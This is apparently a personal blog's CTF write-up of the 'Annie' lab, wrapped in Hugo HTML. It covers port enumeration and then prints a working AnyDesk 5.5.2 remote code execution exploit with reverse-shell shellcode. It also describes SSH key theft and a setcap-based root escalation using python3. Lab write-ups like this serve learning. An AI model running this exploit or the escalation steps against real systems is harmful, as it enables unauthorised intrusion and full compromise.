@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Annie Ctf | Sairas ko website</title>
+<meta property="og:title" content="Annie Ctf | Sairas ko website" />
+<meta name="twitter:title" content="Annie Ctf | Sairas ko website" />
+<meta itemprop="name" content="Annie Ctf | Sairas ko website" />
+<meta name="application-name" content="Annie Ctf | Sairas ko website" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="https://sairas.tech/posts/annie-ctf/" title="English" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-12-01T01:45:35&#43;0545 />
+    <meta property="article:published_time" content=2024-12-01T01:45:35&#43;0545 />
+    <meta property="og:url" content="https://sairas.tech/posts/annie-ctf/" />
+
+    
+    <meta property="og:article:author" content="Sairas" />
+    <meta property="article:author" content="Sairas" />
+    <meta name="author" content="Sairas" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Annie Ctf",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-12-01",
+        "description": "",
+        "wordCount":  897 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-12-01",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Sairas ko website"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.123.7">
+
+    
+    <meta property="og:title" content="Annie Ctf" />
+<meta property="og:description" content="This lab was relativey simple but taught me a lot of things
+Enumeration The thing I like to do is find all the open ports with rustscan and then run nmap for futher analysis, it makes my thing faster by about 10 minutes. So I ran these following commands
+rustscan -a $ip -b 65535 -u 5000 | tee rustscan Then I run nmap on the found ports
+sudo nmap $ip -p xxx,xxx -sV -sC I saw that two ports were open, One was ssh on 22 and real server on 7070" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sairas.tech/posts/annie-ctf/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-12-01T01:45:35+05:45" />
+<meta property="article:modified_time" content="2024-12-01T01:45:35+05:45" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Annie Ctf"/>
+<meta name="twitter:description" content="This lab was relativey simple but taught me a lot of things
+Enumeration The thing I like to do is find all the open ports with rustscan and then run nmap for futher analysis, it makes my thing faster by about 10 minutes. So I ran these following commands
+rustscan -a $ip -b 65535 -u 5000 | tee rustscan Then I run nmap on the found ports
+sudo nmap $ip -p xxx,xxx -sV -sC I saw that two ports were open, One was ssh on 22 and real server on 7070"/>
+
+
+    
+
+    <link rel="canonical" href="https://sairas.tech/posts/annie-ctf/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://sairas.tech/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://sairas.tech/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Annie Ctf</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-12-01T01:45:35&#43;05:45" itemprop="datePublished"> 1 Dec 2024 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#privelege-escalation">Privelege Escalation</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <p>This lab was relativey simple but taught me a lot of things</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>The thing I like to do is find all the open ports with rustscan and then run nmap for futher analysis, it makes my thing faster by about 10 minutes. So I ran these following commands</p>
+<pre tabindex="0"><code>rustscan -a $ip -b 65535 -u 5000 | tee rustscan
+</code></pre><p>Then I run nmap on the found ports</p>
+<pre tabindex="0"><code>sudo nmap $ip -p xxx,xxx -sV -sC
+</code></pre><p>I saw that two ports were open, One was ssh on 22 and real server on 7070</p>
+<pre tabindex="0"><code>PORT      STATE  SERVICE     VERSION
+22/tcp    open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+7070/tcp  open   realserver?
+</code></pre><p>Well this wasn&rsquo;t really enough for me so I just started using nmap scripts and on the first script I ran which was something like this</p>
+<pre tabindex="0"><code>nmap $ip -p 22,7070 --script=safe
+</code></pre><p>I found out that 7070 was running anydesk and I was like &ldquo;Ok, the lab name makes sense now, and I started looking for vulnerabilties on anydesk like doing searchsploit&rdquo;</p>
+<pre tabindex="0"><code>searchsploit anydesk                                                   
+----------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                       |  Path
+----------------------------------------------------------------------------------------------------- ---------------------------------
+AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                                           | windows/local/40410.txt
+AnyDesk 5.4.0 - Unquoted Service Path                                                                | windows/local/47883.txt
+AnyDesk 5.5.2 - Remote Code Execution                                                                | linux/remote/49613.py
+AnyDesk 7.0.15 - Unquoted Service Path                                                               | windows/local/51968.txt
+----------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>well it was not obvious what exploit we need to run so I just googled anydesk exploits too and found out an exploit in exploit-database modified it and ran</p>
+<p>Did I get an Reverseshell? Yes well obviously but I learnt quite a lot in this phase, like the port we need to connect to is not 7070 but another port which anydesk uses with udp so yeah and I made a shellcode like they told me to in the exploit, if you are tackling a lot of problems with that exploit version you can try using another exploit from another site or just copy mine but change the ip and the shellcode</p>
+<pre tabindex="0"><code># Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
+# Date: 09/06/20
+# Exploit Author: scryh
+# Vendor Homepage: https://anydesk.com/en
+# Version: 5.5.2
+# Tested on: Linux
+# Walkthrough: https://devel0pment.de/?p=1881
+import struct
+import socket
+
+Note changes have been made from the original exploit
+
+ip = &#39;10.10.29.248&#39;// Change This
+port = 50001 // No Need To Change This Since Anydesk uses UDP ports for screensharing purposes
+
+def gen_discover_packet(ad_id, os, hn, user, inf, func):
+    d  = b&#39;\x3e\xd1\x01&#39;
+    d += struct.pack(&#39;&gt;I&#39;, ad_id)
+    d += struct.pack(&#39;&gt;I&#39;, 0)
+    d += b&#39;\x02&#39; + bytes([os])
+    d += struct.pack(&#39;&gt;I&#39;, len(hn)) + hn
+    d += struct.pack(&#39;&gt;I&#39;, len(user)) + user
+    d += struct.pack(&#39;&gt;I&#39;, 0)
+    d += struct.pack(&#39;&gt;I&#39;, len(inf)) + inf
+    d += b&#39;\x00&#39;
+    d += struct.pack(&#39;&gt;I&#39;, len(func)) + func
+    d += b&#39;\x02\xc3\x51&#39;
+    return d
+
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b &#34;\x00\x25\x26&#34; -f python -v shellcode
+shellcode =  b&#34;&#34; // Make sure to generate the msfvenom reverse shell payload and replace the shellcode below 
+shellcode += b&#34;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48&#34;
+shellcode += b&#34;\x8d\x05\xef\xff\xff\xff\x48\xbb\x39\xe2\xbf&#34;
+shellcode += b&#34;\x91\x75\x37\x67\xa8\x48\x31\x58\x27\x48\x2d&#34;
+shellcode += b&#34;\xf8\xff\xff\xff\xe2\xf4\x53\xcb\xe7\x08\x1f&#34;
+shellcode += b&#34;\x35\x38\xc2\x38\xbc\xb0\x94\x3d\xa0\x2f\x11&#34;
+shellcode += b&#34;\x3b\xe2\xae\xcd\x7f\x3a\x79\xad\x68\xaa\x36&#34;
+shellcode += b&#34;\x77\x1f\x27\x3d\xc2\x13\xba\xb0\x94\x1f\x34&#34;
+shellcode += b&#34;\x39\xe0\xc6\x2c\xd5\xb0\x2d\x38\x62\xdd\xcf&#34;
+shellcode += b&#34;\x88\x84\xc9\xec\x7f\xdc\x87\x5b\x8b\xd1\xbe&#34;
+shellcode += b&#34;\x06\x5f\x67\xfb\x71\x6b\x58\xc3\x22\x7f\xee&#34;
+shellcode += b&#34;\x4e\x36\xe7\xbf\x91\x75\x37\x67\xa8&#34;
+
+print(&#39;sending payload ...&#39;)
+p = gen_discover_packet(4919, 1, b&#39;\x85\xfe%1$*1$x%18x%165$ln&#39; + shellcode, b&#39;\x85\xfe%18472249x%93$ln&#39;, b&#39;ad&#39;, b&#39;main&#39;)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(p, (ip, port))
+s.close()
+
+print(&#39;reverse shell should connect within 5 seconds&#39;)
+</code></pre><p>This is also copied from (<a href="https://github.com/josephalan42/Exploits/blob/main/AnyDesk%205.5.2%20-%20Remote%20Code%20Executionjohsephalan)[Joseph">https://github.com/josephalan42/Exploits/blob/main/AnyDesk%205.5.2%20-%20Remote%20Code%20Executionjohsephalan)[Joseph</a> Alan]</p>
+<p>Make sure you are running netcat on the another tab and you will connect, you can either use that shell or just go to /home/annie/.ssh and you&rsquo;ll find id_rsa copy that and save that in your system.
+After that get the passphrase, if you don&rsquo;t know how to get the passphrase from an ssh key do check out my another post about it (<a href="https://sairasshrestha.github.io/crackingsshkey">https://sairasshrestha.github.io/crackingsshkey</a>)</p>
+<p>Once you get the passphrase connect it through ssh doing something like</p>
+<pre tabindex="0"><code>ssh -i key annie@$ip
+</code></pre><p>Say yes the fingerprint and put the passphrase when asked, boom now you are in the shell</p>
+<h2 id="privelege-escalation">Privelege Escalation</h2>
+<p>As always you should look through the common files to check for any clue or even look for annie&rsquo;s password like .bash_history or run command <code>env</code>
+But one of it worked for me so I ran a command which was</p>
+<pre tabindex="0"><code>find / -perm /4000 2&gt;/dev/null
+</code></pre><p>It shows us the programs that can run with evalated priveleges like root. And I did found something it was setcap</p>
+<p>TBH, I didn&rsquo;t know shit about it but it felt odd, so I looked into it and found this</p>
+<pre tabindex="0"><code>annie@desktop:~$ find / -perm /4000 2&gt;/dev/null  ```
+*/sbin/setcap*  
+annie@desktop:~$ cd /tmp  
+annie@desktop:/tmp$ cp /usr/bin/python3 .  
+annie@desktop:/tmp$ /sbin/setcap cap_setuid+ep /tmp/python3  
+annie@desktop:/tmp$ ./python3 -c &#34;import os;os.setuid(0);os.system(&#39;/bin/bash&#39;)&#34;  
+root@desktop:/tmp# cd /root/  
+root@desktop:/root# cat root.txt   
+[REDACTED FOR GOOD]
+root@desktop:/root#
+</code></pre><p>Mindfucked? Lemme elaborate</p>
+<pre tabindex="0"><code>- You are copying Python to `/tmp/` and giving it the ability to change its user ID (via `cap_setuid`).
+- This could be used to run commands or scripts with elevated privileges, potentially allowing you to execute code as another user (like `root`).
+- - Normally, only root or processes with `setuid` privileges can change the user ID of a running process.
+- By giving the Python binary the `cap_setuid` capability, you are allowing it to change its user ID (potentially to root) without being a privileged user.
+I hope now you got it, I&#39;m also a noob in this field but I try to write writeups to learn myself more than teaching others. Have a good day!!! BTW I hate Elon Musk```
+</code></pre>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://www.linkedin.com/in/sairas-shrestha-aaa87531a/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+<a href="https://github.com/sairasshrestha" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://instagram.com/saerus_stha" target="_blank" rel="noopener noreferrer me"
+    title="Instagram">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+    <line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line>
+</svg>
+</a>
+<a href="https://x.com/SairasShre9259" target="_blank" rel="noopener noreferrer me"
+    title="X">
+    <svg viewBox="0 0 1200 1227" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+    <path
+        d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z"/>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 Sairas.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="https://sairas.tech/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
